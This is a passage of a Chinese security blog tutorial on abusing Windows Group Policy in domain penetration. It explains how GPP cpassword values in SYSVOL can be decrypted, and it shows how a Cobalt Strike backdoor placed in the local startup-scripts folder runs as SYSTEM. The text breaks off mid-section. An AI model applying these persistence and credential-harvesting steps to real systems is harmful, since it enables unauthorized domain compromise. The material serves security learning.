<html>
<head>
<title>内网渗透浅谈域渗透中的组策略及gpp运用</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
内网渗透 | 浅谈域渗透中的组策略及gpp运用
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Drunkmars
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-05-18</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><span style="font-size:18px;line-height:38px;;"><strong>0x00 前言</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">最近在实战过程中遇到了组策略，发现攻击面其实挺宽广的，这里记录下自己的分析和学习过程。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><span style="font-size:18px;line-height:38px;;"><strong>0x01 组策略的认识</strong></span></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>组策略</strong>（英语：<strong>Group Policy</strong>）是微软</span><span style="font-size:15px;line-height:35px;;">Windows NT</span><span style="font-size:15px;line-height:35px;;">家族</span><span style="font-size:15px;line-height:35px;;">操作系统</span><span style="font-size:15px;line-height:35px;;">的一个特性，它可以控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和</span><span style="font-size:15px;line-height:35px;;">活动目录</span><span style="font-size:15px;line-height:35px;;">中用户设置的集中化管理和配置。组策略的其中一个版本名为<strong>本地组策略</strong>（缩写“LGPO”或“LocalGPO”），这可以在独立且非</span><span style="font-size:15px;line-height:35px;;">域</span><span style="font-size:15px;line-height:35px;;">的计算机上管理组策略对象。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">通过使用组策略，你可以设置策略设置一次，然后将该设置复制到多台计算机上。例如，你可以在链接到域的 GPO 中设置多个 Internet Explorer11 安全设置，然后将所有这些设置应用到域中的每台计算机。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">根据作用范围不同组策略可划分为多种，并且拥有自己的执行顺序和继承原则。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x1.1 密码的难题</span></strong><span style="font-size:15px;line-height:35px;;"></span></a></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">每台Windows主机有一个内置的Administrator账户以及相关联的密码。大多数组织机构为了安全，可能都会要求更改密码，虽然这种方法的效果并不尽如人意。标准的做法是利用组策略去批量设置工作站的本地Administrator密码。但是这样又会出现另一个问题，那就是所有的电脑都会有相同的本地Administrator密码。也就是说，如果获取了一个系统的Administrator认证凭据，黑客就可以获取他们所有机器的管理权限。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x1.2 SYSVOL</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">解决办法之一是为认证数据采取SYSVOL，SYSVOL是AD（活动目录）里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">所有的域组策略存储在：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x1.3 SYSVOL里的认证</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">在windows电脑中，管理需要花心思去保证本地Administrator账户（RID 500）。传统的做法（除了购买安全产品），是使用一个自定义的脚本去更改本地Administrator的密码。这样就会出现一个问题，密码肯定会明文存储在SYSVOL的脚本里(比如vbs文件)。比如黑客需要搜寻用来更改本地Administrator密码的VBS脚本，该vbs脚本在Microsoft TechNet gallery上，密码为可见的。这个脚本存在SYSVOL里，每个域用户都有读的权限，且该密码是每台电脑组策略应用的本地Administrator密码。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x1.4 组策略偏好GPP</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">在2006年，微软收购了桌面标准的“PolicyMaker”，并重新借此与win2008发布了GPP（组策略偏好）。其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">映射驱动（Drives.xml）</span></p><p><span style="font-size:15px;line-height:35px;;">创建本地用户</span></p><p><span style="font-size:15px;line-height:35px;;">数据源（DataSources.xml）</span></p><p><span style="font-size:15px;line-height:35px;;">打印机配置（Printers.xml）</span></p><p><span style="font-size:15px;line-height:35px;;">创建/更新服务（Services.xml）</span></p><p><span style="font-size:15px;line-height:35px;;">计划任务（ScheduledTasks.xml）</span></p><p><span style="font-size:15px;line-height:35px;;">更改本地Administrator密码</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这对管理员非常有用，因为GPP提供了一个自动化机制，可以作为急需的解决方案（比如脚本）给他们。它提供了有效的方法，利用显式凭据结合组策略部署了计划任务，一次性批量更改了电脑的本地管理的密码，也许这就是最受欢迎的利用场景吧。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x1.5 GPP中存储的凭据</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">然而现在有个问题，凭据数据应该怎样保护？</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">当管理创建了一个新的GPP时，SYSVOL里有一个XML文件提供了相关配置数据。如果里面提供了密码的话，那应该就是AES-256加密，看起来这加密似乎是够强力了。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.4550063371356147" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/1_vrJ3ib0L44KibH9LqqmzL8onHgX6Xw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4kpGrliaoNWASajaccicnNCQmBDy7vrJ3ib0L44KibH9LqqmzL8onHgX6Xw/640?wx_fmt=png'" data-type="png" data-w="789"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">然而除了在2012年前的某些点外，微软在</span><span style="font-size:15px;line-height:35px;;">MSDN上发布了AES的私钥</span><span style="font-size:15px;line-height:35px;;">，它可以用来解密这种密码。因为认证用户（所有域用户或者信任域里的用户）对SYSVOL拥有读权限。在域里的任何用户可以搜索SYSVOL共享中的带有cpassword字样的XML文件，里面包含了AES加密的密码。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.1318051575931232" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/2_aq0EVFQGeYspzh0grsI4aMSEhiaF9w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4Chhibo1BlyVk3JOIk05nmCtMuTaq0EVFQGeYspzh0grsI4aMSEhiaF9w/640?wx_fmt=png'" data-type="png" data-w="1047"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></h1><h1><span style="font-size:18px;line-height:38px;;"><strong>0x02 组策略的分类</strong></span></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x2.1 本地组策略（LGP）</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>本地组策略</strong>（Local Group Policy，缩写LGP或LocalGPO）是组策略的基础版本，它面向独立且非域的计算机。至少Windows XP家庭版中它就已经存在，并且可以应用到域计算机。在Windows Vista以前，LGP可以强制施行组策略对象到单台本地计算机，但不能将策略应用到用户或组。从Windows Vista开始，LGP允许本地组策略管理单个用户和组，并允许使用“GPO Packs”在独立计算机之间备份、导入和导出组策略——组策略容器包含导入策略到目标计算机的所需文件。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里演示下利用本地组策略来加载我们的后门程序</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我直接用CS生成一个window的后门shell.exe</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">开始-&gt;运行-&gt;键入"gpedit.msc"-&gt;本地组策略编辑器-&gt;window设置(system)-&gt;脚本-&gt;启动-&gt;属性</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.551660516605166" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/3_hhbxAvFrmooaMRyfQAbQuURpB9So5Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4Futgznly8nR8OMaMOZJZqicqThhbxAvFrmooaMRyfQAbQuURpB9So5Q/640?wx_fmt=png'" data-type="png" data-w="542"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">点击显示文件:</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__section">C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup</span></span></code></pre></section><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">把我们的后门程序复制到这个路径,然后这个脚本开机就会自动加载执行了</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5760401721664276" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/4_Da9YKlibB0iaC9JOR0uRyTpfRe7DxQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4nBQ9Y7GqJeOx41picGPygRnvmgUDa9YKlibB0iaC9JOR0uRyTpfRe7DxQ/640?wx_fmt=png'" data-type="png" data-w="1394"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5631424375917768" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/5_4PEA9hYytJsXuW6iaUW6wsCKBpuoZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4v85kCQvaHSFMicNYbic8LQYLP5O4PEA9hYytJsXuW6iaUW6wsCKBpuoZw/640?wx_fmt=png'" data-type="png" data-w="1362"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">当我们重新启动的时候，发现直接以system权限加载了我们的程序</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.2503937007874016" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/6_yNzLkhyyZmDmgtaYRC36ic9N68TQ0Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4HjoQJTUQfuGlRicLhGryOfdsSlyNzLkhyyZmDmgtaYRC36ic9N68TQ0Q/640?wx_fmt=png'" data-type="png" data-w="1270"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">用ps1脚本上线同理，也是拿到了一个system权限</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-backh="337" data-backw="490" data-ratio="0.6877551020408164" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/7_9Ap4tIicVfaDbhpMlp4dQ3beabTE3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4LSicrPXibz4TF9OWOvcTe7UVXiaz9Ap4tIicVfaDbhpMlp4dQ3beabTE3Q/640?wx_fmt=png'" data-type="png" data-w="490" style="width: 100%;height: auto;"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-backh="233" data-backw="376" data-ratio="0.6196808510638298" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/8_lhvCBDD6JKeAvVGicdYJ5BbM4VdWqw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4XynySaZsYY7xLX0ZXmb9a2cBmlhvCBDD6JKeAvVGicdYJ5BbM4VdWqw/640?wx_fmt=png'" data-type="png" data-w="376" style="width: 100%;height: auto;"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5518001469507715" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/9_RfWVqZ0QyniaJxZsS0S3saJTZVAX2w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4umdQNJ3BZgPDAgPiaG2la4sQ7icRfWVqZ0QyniaJxZsS0S3saJTZVAX2w/640?wx_fmt=png'" data-type="png" data-w="1361"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.25" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/10_aZXVRRMx2RrK6PzSlib5hmqejyvXDg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4vgN4r2yBtY4BLzUMBsPW7eZQvaZXVRRMx2RrK6PzSlib5hmqejyvXDg/640?wx_fmt=png'" data-type="png" data-w="1268"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><strong><span style="font-size:15px;line-height:35px;;">0x2.2 域组策略</span></strong><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">当机器安装了域环境的时候,系统管理工具会多出一个功能(组策略管理),通过它，域管理员能够很方便统一地对域内的机器和用户进行统一管理。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">域管理员经常会面对一个这样的问题,域成员机子的默认本地管理员密码过于简单，想进行批量修改的时候，这个时候就可以利用组策略来进行任务的批量下发。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><ul class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">1.通过在域中下发脚本来执行</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">2.在组策略首选项GPP中进行设置</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">3.本地管理员密码解决方案:LAPS(不细说这个内容，这是解决这个问题很好的方案)</span></p></li></ul><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">首先我们需要了解下AD域中两个默认的共享文件夹:SYSVOL&nbsp;NETLOGON</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5094339622641509" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/11_ILM6skMQ8CibEaB8ia7zicVXxicjlA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4cVQf2dLXWHYal3jWCPWLQiaOhick9RILM6skMQ8CibEaB8ia7zicVXxicjlA/640?wx_fmt=png'" data-type="png" data-w="848"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>NETLOGON目录</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">挂载点:SYSVOL\domain\SCRIPTS&nbsp;主要存放的是一些脚本信息，是AD活动目录安装时候自动创建的，是在sysvol下面的一个子目录文件夹</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>SYSVOL目录</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">SYSVOL目录是AD域中的一个共享文件夹，该文件夹在AD活动目录安装时候被创建。通常用来存放组策略数据 和 一些脚本 配置文件，这些策略和脚本将用于传递给域成员机器。<br  /><br  />此外，域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，并且所有的AD用户都可以访问它</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">在域中，用户登录（计算机）时，会首先在SYSVOL文件查找GPO和启动脚本。同时，为了保证系统的正常运行，必须为SYSVOL保留足够的空间缓存，而且不能随意删除、改动该文件夹，要不然会出现一些组策略无法启用等报错信息</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">该目录由于针对的是域内所有机器和用户，所以域内中的合法用户均可以访问和执行该目录的文件。(普通的域用户也可以)</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5314926660914582" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/12_ClDyLib6OicLGZl0Ll7MVnGVnQLFUw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4Fqv52qOc0uK55gTpo3Z4XQsTQ1ClDyLib6OicLGZl0Ll7MVnGVnQLFUw/640?wx_fmt=png'" data-type="png" data-w="1159"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.3047735618115055" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/13_3kyNE1HaMdkrHicibZaddQYlk7dcUQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4Dr8KJ1GhRtiaUumKCXZaaLZxuOg3kyNE1HaMdkrHicibZaddQYlk7dcUQ/640?wx_fmt=png'" data-type="png" data-w="817"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">如果更改权限，这个地方会显示拒绝访问</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span 